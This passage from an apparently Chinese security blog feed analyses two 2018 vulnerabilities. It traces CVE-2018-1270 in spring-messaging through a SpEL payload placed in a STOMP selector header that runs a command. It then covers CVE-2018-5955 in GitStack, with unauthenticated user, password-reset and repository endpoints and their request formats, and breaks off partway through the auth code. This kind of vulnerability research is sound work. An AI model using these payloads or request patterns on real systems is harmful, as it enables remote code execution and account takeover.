<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>当在 <a href="http://localhost:8080/" target="_blank" rel="external">http://localhost:8080/</a> 中点击Connect后，在app.js中，有如下代码，会建立起Websocket连接：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> header  = &#123;<span class="string">"selector"</span>:<span class="string">"T(java.lang.Runtime).getRuntime().exec('calc.exe')"</span>&#125;;</div><div class="line">...</div><div class="line">stompClient.subscribe(<span class="string">'/topic/greetings'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">greeting</span>) </span>&#123;</div><div class="line">    showGreeting(<span class="built_in">JSON</span>.parse(greeting.body).content);</div><div class="line">&#125;,header);</div></pre></td></tr></table></figure></p>
<p>其中<code>header</code>中指定了<code>selector</code>，根据 <a href="https://stomp.github.io/stomp-specification-1.0.html" target="_blank" rel="external">Stomp Protocol Specification, Version 1.0</a>，通过指定对应的selecttor，可以对订阅的信息进行过滤：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Stomp brokers may support the selector header which allows you to specify an SQL 92 selector on the message headers which acts as a filter for content based routing.</div><div class="line"></div><div class="line">You can also specify an id header which can then later on be used to UNSUBSCRIBE from the specific subscription as you may end up with overlapping subscriptions using selectors with the same destination. If an id header is supplied then Stomp brokers should append a subscription header to any MESSAGE commands which are sent to the client so that the client knows which subscription the message relates to. If using Wildcards and selectors this can help clients figure out what subscription caused the message to be created.</div></pre></td></tr></table></figure></p>
<p>在 org/springframework/messaging/simp/broker/DefaultSubscriptionRegistry.java 第140行，对这个header参数进行了接受和处理：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">addSubscriptionInternal</span><span class="params">(</span></span></div><div class="line">        String sessionId, String subsId, String destination, Message&lt;?&gt; message) &#123;</div><div class="line"></div><div class="line">    Expression expression = <span class="keyword">null</span>;</div><div class="line">    MessageHeaders headers = message.getHeaders();</div><div class="line">    String selector = SimpMessageHeaderAccessor.getFirstNativeHeader(getSelectorHeaderName(), headers);</div><div class="line">    <span class="keyword">if</span> (selector != <span class="keyword">null</span>) &#123;</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            expression = <span class="keyword">this</span>.expressionParser.parseExpression(selector);</div><div class="line">            <span class="keyword">this</span>.selectorHeaderInUse = <span class="keyword">true</span>;</div><div class="line">            <span class="keyword">if</span> (logger.isTraceEnabled()) &#123;</div><div class="line">                logger.trace(<span class="string">"Subscription selector: ["</span> + selector + <span class="string">"]"</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">catch</span> (Throwable ex) &#123;</div><div class="line">            <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</div><div class="line">                logger.debug(<span class="string">"Failed to parse selector: "</span> + selector, ex);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">this</span>.subscriptionRegistry.addSubscription(sessionId, subsId, destination, expression);</div><div class="line">    <span class="keyword">this</span>.destinationCache.updateAfterNewSubscription(destination, sessionId, subsId);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180407/3.jpg?raw=true" alt=""></p>
<p>如图所示，此次连接对应的sessionId为<code>mrzfa005</code>，subsId为<code>sub-0</code>。</p>
<p>之后，在 <a href="http://localhost:8080/" target="_blank" rel="external">http://localhost:8080/</a> 中输入任意字符串，点击send。spring进行了一系列处理后，开始向消息的订阅者分发消息，在 org/springframework/messaging/simp/broker/SimpleBrokerMessageHandler.java:349 行：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">sendMessageToSubscribers</span><span class="params">(@Nullable String destination, Message&lt;?&gt; message)</span> </span>&#123;</div><div class="line">    MultiValueMap&lt;String,String&gt; subscriptions = <span class="keyword">this</span>.subscriptionRegistry.findSubscriptions(message);</div><div class="line">    ...</div></pre></td></tr></table></figure></p>
<p>其中message保存了此次连接/会话的相关信息：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180407/5.jpg?raw=true" alt=""></p>
<p>跟入 <code>this.subscriptionRegistry.findSubscriptions</code> 至 org/springframework/messaging/simp/broker/AbstractSubscriptionRegistry.java:111 行：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> MultiValueMap&lt;String, String&gt; <span class="title">findSubscriptions</span><span class="params">(Message&lt;?&gt; message)</span> </span>&#123;</div><div class="line">    ....</div><div class="line">    <span class="keyword">return</span> findSubscriptionsInternal(destination, message);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>message作为参数被传入 <code>findSubscriptionsInternal</code> ，在return处继续跟进至 org/springframework/messaging/simp/broker/DefaultSubscriptionRegistry.java:184行<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">protected</span> MultiValueMap&lt;String, String&gt; <span class="title">findSubscriptionsInternal</span><span class="params">(String destination, Message&lt;?&gt; message)</span> </span>&#123;</div><div class="line">    MultiValueMap&lt;String, String&gt; result = <span class="keyword">this</span>.destinationCache.getSubscriptions(destination, message);</div><div class="line">    <span class="keyword">return</span> filterSubscriptions(result, message);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>其中result变量值如下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180407/6.jpg?raw=true" alt=""></p>
<p>该变量即 org/springframework/messaging/simp/broker/DefaultSubscriptionRegistry.java:201行的filterSubscriptions方法的<code>allMatches</code>变量，跟进至两层for循环<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> (String sessionId : allMatches.keySet()) &#123;</div><div class="line">    <span class="keyword">for</span> (String subId : allMatches.get(sessionId)) &#123;</div><div class="line">        SessionSubscriptionInfo info = <span class="keyword">this</span>.subscriptionRegistry.getSubscriptions(sessionId);</div><div class="line">        <span class="keyword">if</span> (info == <span class="keyword">null</span>) &#123;</div><div class="line">            <span class="keyword">continue</span>;</div><div class="line">        &#125;</div><div class="line">        Subscription sub = info.getSubscription(subId);</div><div class="line">        <span class="keyword">if</span> (sub == <span class="keyword">null</span>) &#123;</div><div class="line">            <span class="keyword">continue</span>;</div><div class="line">        &#125;</div><div class="line">        ...</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>通过两次<code>getSubscriptions</code>操作，此时取出了先前的配置信息，sub变量值如下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180407/7.jpg?raw=true" alt=""></p>
<p>接下去第 207 行将selector表达式取出：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Expression expression = sub.getSelectorExpression();</div></pre></td></tr></table></figure></p>
<p>第217行：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">try</span> &#123;</div><div class="line">    <span class="keyword">if</span> (Boolean.TRUE.equals(expression.getValue(context, Boolean.class))) &#123;</div><div class="line">        result.add(sessionId, subId);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>通过调用了<code>expression.getValue(context, Boolean.class)</code>，触发payload，执行了spel表达式，远程命令执行成功。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180407/8.jpg?raw=true" alt=""></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://github.com/spring-guides/gs-messaging-stomp-websocket" target="_blank" rel="external">spring-guides/gs-messaging-stomp-websocket</a></li>
<li><a href="https://docs.spring.io/spring/docs/current/spring-framework-reference/web.html#websocket-stomp" target="_blank" rel="external">spring-framework-reference: websocket-stomp</a></li>
<li><a href="https://blog.csdn.net/pacosonswjtu/article/details/51914567" target="_blank" rel="external">springmvc(18)使用WebSocket 和 STOMP 实现消息功能</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2252&quot;&gt;spring-messaging Remote Code Execution 分析-【CVE-2018-1270】&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
    
    
      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
    
      <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
      <category term="spring" scheme="http://chybeta.github.io/tags/spring/"/>
    
  </entry>
  
  <entry>
    <title>GitStack &lt;= 2.3.10 远程命令执行漏洞分析-【CVE-2018-5955】</title>
    <link href="http://chybeta.github.io/2018/03/30/GitStack-2-3-10-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-5955%E3%80%91/"/>
    <id>http://chybeta.github.io/2018/03/30/GitStack-2-3-10-远程命令执行漏洞分析-【CVE-2018-5955】/</id>
    <published>2018-03-30T10:37:23.000Z</published>
    <updated>2018-03-31T00:36:34.003Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/2235" target="_blank" rel="external">GitStack &lt;= 2.3.10 远程命令执行漏洞分析-【CVE-2018-5955】</a><br><a id="more"></a></p>
<h1 id="GitStack"><a href="#GitStack" class="headerlink" title="GitStack"></a>GitStack</h1><p>GitStack是一款win平台下的Git可视化平台。其最新版本2.3.10存在一个远程命令执行漏洞(<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5955" target="_blank" rel="external">CVE-2018-5955</a>)，对应下载地址： <a href="https://gitstack.com/download/" target="_blank" rel="external">https://gitstack.com/download/</a> 。</p>
<p>安装完成后，登陆入口在 <a href="http://192.168.248.130/registration/login/?next=/gitstack/" target="_blank" rel="external">http://192.168.248.130/registration/login/?next=/gitstack/</a> 。默认用户名/密码分别为： admin/admin</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="一些“小”漏洞"><a href="#一些“小”漏洞" class="headerlink" title="一些“小”漏洞"></a>一些“小”漏洞</h2><p><code>views.py</code>中的问题太多了，为后续的命令执行利用，这里仅列一些。目测开发者在开发的时候想这些接口开放着也没关系。。</p>
<h3 id="用户相关rest-user"><a href="#用户相关rest-user" class="headerlink" title="用户相关rest_user"></a>用户相关rest_user</h3><p>首先在<code>app/rest/views.py</code>中定义了<code>rest_user</code>方法：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@csrf_exempt</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">rest_user</span><span class="params">(request)</span>:</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        <span class="comment"># create user</span></div><div class="line">        <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</div><div class="line">            username = request.POST[<span class="string">'username'</span>]</div><div class="line">            password = request.POST[<span class="string">'password'</span>]</div><div class="line">            </div><div class="line">            <span class="comment"># get the username/password from the request</span></div><div class="line">            <span class="comment"># check the username</span></div><div class="line">            matcher = re.compile(<span class="string">"^[A-Za-z]\w&#123;2,&#125;$"</span>)</div><div class="line">            <span class="keyword">if</span> matcher.match(username) <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">                <span class="keyword">raise</span> Exception(<span class="string">"Please enter an alphanumeric name without spaces"</span>)</div><div class="line">            <span class="keyword">if</span>(username == <span class="string">""</span>):</div><div class="line">                <span class="keyword">raise</span> Exception(<span class="string">"Please enter a non empty name"</span>)</div><div class="line">            </div><div class="line">            user = UserFactory.instantiate_user(username, password)</div><div class="line">            user.create()</div><div class="line">            <span class="keyword">return</span> HttpResponse(<span class="string">"User created"</span>)</div><div class="line">        <span class="comment"># get retrieve_all the users</span></div><div class="line">        <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</div><div class="line">            <span class="comment"># convert list of objects to list of strings</span></div><div class="line">            user_list_str = []</div><div class="line">            user_list_obj = UserFactory.instantiate_user(<span class="string">''</span>).retrieve_all()</div><div class="line">            <span class="keyword">for</span> user <span class="keyword">in</span> user_list_obj:   </div><div class="line">                user_list_str.append(user.username)</div><div class="line">            json_reply = json.dumps(user_list_str)</div><div class="line">            <span class="keyword">return</span> HttpResponse(json_reply)</div><div class="line">        <span class="comment"># update the user</span></div><div class="line">        <span class="keyword">if</span> request.method == <span class="string">'PUT'</span>:</div><div class="line">            <span class="comment"># retrieve the credentials from the json</span></div><div class="line">            credentials = json.loads(request.raw_post_data)</div><div class="line">            <span class="comment"># create an instance of the user and update it</span></div><div class="line">            user = UserFactory.instantiate_user(credentials[<span class="string">'username'</span>], credentials[<span class="string">'password'</span>])</div><div class="line">            user.update()</div><div class="line">            <span class="keyword">return</span> HttpResponse(<span class="string">"User successfully updated"</span>)</div><div class="line">        </div><div class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</div><div class="line">        <span class="keyword">return</span> HttpResponseServerError(e)</div></pre></td></tr></table></figure></p>
<p>在默认情况下：</p>
<ol>
<li><p>使用GET方式可以直接查看GitStack仓库的用户列表，存在未授权访问信息泄露漏洞<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180330/2.jpg?raw=true" alt=""></p>
</li>
<li><p>通过POST方法，指定username和password可以直接添加仓库用户，存在任意用户添加漏洞：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180330/3.jpg?raw=true" alt=""></p>
</li>
<li><p>通过PUT方法，以JSON格式即可重置任意用户密码：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180330/6.jpg?raw=true" alt=""></p>
</li>
</ol>
<h3 id="project相关"><a href="#project相关" class="headerlink" title="project相关"></a>project相关</h3><h4 id="任意创建repo"><a href="#任意创建repo" class="headerlink" title="任意创建repo"></a>任意创建repo</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># create a repository</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">rest_repository</span><span class="params">(request)</span>:</span></div><div class="line">    <span class="comment"># Add new repository</span></div><div class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</div><div class="line">        name=request.POST[<span class="string">'name'</span>]</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            <span class="comment"># check the repo name</span></div><div class="line">            matcher = re.compile(<span class="string">"^\w&#123;1,&#125;$"</span>)</div><div class="line">            <span class="keyword">if</span> matcher.match(name) <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">                <span class="keyword">raise</span> Exception(<span class="string">"Please enter an alphanumeric name without spaces"</span>)</div><div class="line">            <span class="keyword">if</span>(name == <span class="string">""</span>):</div><div class="line">                <span class="keyword">raise</span> Exception(<span class="string">"Please enter a non empty name"</span>)</div><div class="line">            <span class="comment"># create the repo</span></div><div class="line">            repository = Repository(name)</div><div class="line">            repository.create()</div><div class="line">    ....</div></pre></td></tr></table></figure>
<p>直接POST一个name即可创建对应的project，不过在POST的时候需要带上CSRF_TOKEN<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180330/7.jpg?raw=true" alt=""></p>
<p>CSRF_TOKEN的获得如下，访问登陆页面，比如 <a href="http://192.168.248.130/registration/login/?next=/gitstack/" target="_blank" rel="external">http://192.168.248.130/registration/login/?next=/gitstack/</a> ，查看源代码：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180330/10.jpg?raw=true" alt=""></p>
<h4 id="任意repo添加user"><a href="#任意repo添加user" class="headerlink" title="任意repo添加user"></a>任意repo添加user</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@csrf_exempt</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">rest_repo_user</span><span class="params">(request, repo_name, username)</span>:</span></div><div class="line">    repo = Repository(repo_name)</div><div class="line">    user = UserFactory.instantiate_user(username)</div><div class="line"></div><div class="line">    <span class="comment"># Add user</span></div><div class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            <span class="comment"># Get the repository and add the user</span></div><div class="line">            repo.add_user(user)</div><div class="line">            repo.add_user_read(user)</div><div class="line">            repo.add_user_write(user)</div><div class="line">            repo.save()</div><div class="line">            <span class="keyword">return</span> HttpResponse(<span class="string">"User "</span> + username + <span class="string">" added to "</span> + repo_name)</div><div class="line">    ...</div></pre></td></tr></table></figure>
<p>按照下面这个格式即可添加：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">POST http://xx/rest/repository/项目名/user/用户名/</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180330/11.jpg?raw=true" alt=""></p>
<h2 id="远程命令执行漏洞"><a href="#远程命令执行漏洞" class="headerlink" title="远程命令执行漏洞"></a>远程命令执行漏洞</h2><p>默认情况下GitStack的<code>Web Interface</code>接口时开启的。访问<code>http://xx/web/index.php</code>也即访问<code>gitphp</code>目录下的index.php.</p>
<p>第 153 行进行了认证操作：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="comment">/*</span></div><div class="line">	 * Authentification</div><div class="line">	 */</div><div class="line">    $auth = <span class="keyword">new</span> GitPHP_Authentication();</div><div class="line">    $auth-&gt;authenticate();</div><div class="line">    ... </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p><code>GitPHP_Authentication</code>定义在<code>gitphp/include/Authentication.class.php</code>中：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">GitPHP_Authentication</span></span></div><div class="line">&#123;</div><div class="line">    ....</div><div class="line"></div><div class="line">	<span class="comment">// Authenticate the user</span></div><div class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">authenticate</span><span class="params">()</span></span></div><div class="line">	&#123;</div><div class="line">		</div><div class="line">		<span class="comment">// Get the project name</span></div><div class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'p'</span>]))&#123;</div><div class="line"></div><div class="line">			<span class="comment">//$this-&gt;project_name = substr($_GET['p'], 0, -1);</span></div><div class="line">			<span class="keyword">$this</span>-&gt;project_name = $_GET[<span class="string">'p'</span>];</div><div class="line">			</div><div class="line">			<span class="comment">// Read the users of the project</span></div><div class="line">			$users = <span class="keyword">$this</span>-&gt;readRepositoryReadUsers();</div><div class="line">			<span class="comment">// check if the user everyone is in the list</span></div><div class="line">			<span class="keyword">if</span>(in_array(<span class="string">'everyone'</span>, $users))</div><div class="line">			&#123;</div><div class="line">				<span class="comment">// yes</span></div><div class="line">				<span class="keyword">return</span> <span class="keyword">true</span>; <span class="comment">// the user do not need to be authenticated</span></div><div class="line">			&#125;</div><div class="line">			<span class="keyword">else</span></div><div class="line">			&#123;</div><div class="line">				</div><div class="line">				<span class="comment">// The user should be authenticated</span></div><div class="line">				<span class="comment">// Ask for username/password</span></div><div class="line">				<span class="keyword">if</span> (!<span class="keyword">isset</span>($_SERVER[<span class="string">'PHP_AUTH_USER'</span>])) &#123;</div><div class="line"></div><div class="line">					header(<span class="string">'WWW-Authenticate: Basic realm="Enter a username/password of a user which has the rights to access to this repository. ADMIN PASSWORD WON\'T WORK"'</span>);</div><div class="line">					header(<span class="string">'HTTP/1.0 401 Unauthorized'</span>);</div><div class="line">					<span class="keyword">echo</span> <span class="string">'xxx省略'</span>;</div><div class="line">					<span class="keyword">exit</span>;</div><div class="line">				&#125; <span class="keyword">else</span> &#123;</div><div class="line">					<span class="comment">// try to authenticate</span></div><div class="line">					$authenticated = <span class="keyword">false</span>;</div><div class="line">					$username = $_SERVER[<span class="string">'PHP_AUTH_USER'</span>];</div><div class="line">					$password = $_SERVER[<span class="string">'PHP_AUTH_PW'</span>];</div><div class="line">					</div><div class="line">					<span class="comment">// Check if the user is in the array of read users</span></div><div class="line">					<span class="keyword">if</span>(in_array($username, $users))&#123;</div><div class="line">						$authMethod = <span class="keyword">$this</span>-&gt;getAuthMethod();</div><div class="line">						<span class="comment">// authenticate with ldap or by file</span></div><div class="line">						<span class="keyword">if</span>($authMethod == <span class="string">"file"</span>)&#123;</div><div class="line">							$authenticated = <span class="keyword">$this</span>-&gt;authenticateFile($username, $password);</div><div class="line">						&#125; <span class="keyword">if</span>($authMethod == <span class="string">"ldap"</span>) &#123;</div><div class="line">							$authenticated = <span class="keyword">$this</span>-&gt;authenticateLdap($username, $password);</div><div class="line"></div><div class="line">						&#125;</div><div class="line">						<span class="keyword">if</span> ($authenticated == <span class="keyword">false</span>)&#123;</div><div class="line">							<span class="keyword">$this</span>-&gt;denyAuthentication();</div><div class="line">						&#125;</div><div class="line">					&#125; <span class="keyword">else</span> &#123;</div><div class="line">						</div><div class="line">						<span class="keyword">$this</span>-&gt;denyAuthentication();</div><div class="line">					&#125;</div><div class="line">					</div><div class="line">				&#125;</div><div class="line">			&#125;</div><div class="line">			</div><div class="line">		&#125;</div><div class="line">		</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
<p>当访问<code>index.php</code>时指定了参数p，也即<code>project_name</code>，会通过<code>$this-&gt;readRepositoryReadUsers()</code>将该project对应的user提取出来。倘若该project并非公开，即<code>everyone</code>并不在<code>$users</code>中，则进入<code>authenticated</code>阶段。</p>
<p>可以看到，在这部分的认证中，采用了<code>HTTP Basic Authentication</code>的方式<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180330/5.jpg?raw=true" alt=""></p>
<p>根据<a href="http://php.net/manual/zh/features.http-auth.php" target="_blank" rel="external">php手册</a>,当PHP以Apache模块方式运行时可以用 header()函数来向客户端浏览器发送认证请求信息。而当用户输入用户名和密码后，包含有URL的PHP脚本将会把变量<code>PHP_AUTH_USER</code>,<code>PHP_AUTH_PW</code>和<code>AUTH_TYPE</code>分别被设定为用户名，密码和认证类型。也就是说，这里的<code>username</code>与<code>password</code>即我们可控，且未加以过滤的变量：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$username = $_SERVER[<span class="string">'PHP_AUTH_USER'</span>];</div><div class="line">$password = $_SERVER[<span class="string">'PHP_AUTH_PW'</span>];</div></pre></td></tr></table></figure></p>
<p>在确认输入的用户名(<code>$username</code>)在project的用户列表后，开始进行真正的认证操作。首先是获取认证类型<code>$authMethod = $this-&gt;getAuthMethod();</code>：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">	<span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">getAuthMethod</span><span class="params">()</span></span>&#123;</div><div class="line">		<span class="comment">// Read the gitstack settings file</span></div><div class="line">		$settingsDir = GitPHP_Config::GetInstance()-&gt;GetValue(<span class="string">'gitstacksettings'</span>, <span class="string">''</span>);</div><div class="line"></div><div class="line">		<span class="comment">// read the ini file</span></div><div class="line">		$ini_array = parse_ini_file($settingsDir, <span class="keyword">true</span>, INI_SCANNER_RAW);</div><div class="line">		$authMethod = $ini_array[<span class="string">'authentication'</span>][<span class="string">'authmethod'</span>];</div><div class="line">		<span class="comment">// should contain "ldap" or "file"</span></div><div class="line">		<span class="keyword">return</span> $authMethod;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><code>gitstacksettings</code>的默认值在<code>data/settings.ini</code>中设定，其中：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[authentication]</div><div class="line">authmethod = file</div><div class="line">ldapprotocol =</div></pre></td></tr></table></figure></p>
<p>也即在默认情况下采用的是<code>file</code>方式的认证方法，程序流程进入：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">    <span class="keyword">if</span>($authMethod == <span class="string">"file"</span>)&#123;</div><div class="line">        $authenticated = <span class="keyword">$this</span>-&gt;authenticateFile($username, $password);</div><div class="line">    &#125; </div><div class="line">```                        </div><div class="line"></div><div class="line">`authenticateFile`定义在`gitphp/<span class="keyword">include</span>/Authentication.class.php`第<span class="number">182</span>行：</div><div class="line">```php </div><div class="line">	<span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">authenticateFile</span><span class="params">($username, $password)</span></span>&#123;</div><div class="line">	